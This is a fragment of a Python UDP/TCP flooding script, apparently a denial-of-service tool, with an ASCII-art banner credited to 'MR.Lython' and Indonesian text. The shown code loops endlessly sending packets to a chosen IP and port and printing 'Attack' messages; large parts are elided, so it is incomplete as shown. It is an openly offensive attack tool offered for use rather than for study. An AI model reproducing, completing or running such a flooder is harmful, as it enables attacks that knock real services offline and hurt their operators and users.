...
╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝
    ...
    | UDP Attack Credit By MR.Lython |
        |Methods = UDP atau TCP|
""")
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(" 0xF1 Mr.Lython %s Attack %s"%(ip,port))
		except:
			print(" 0xF1 Mr.Lython %s Attack %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m 0xF1 Mr.Lython %s Attack %s"%(ip,port))
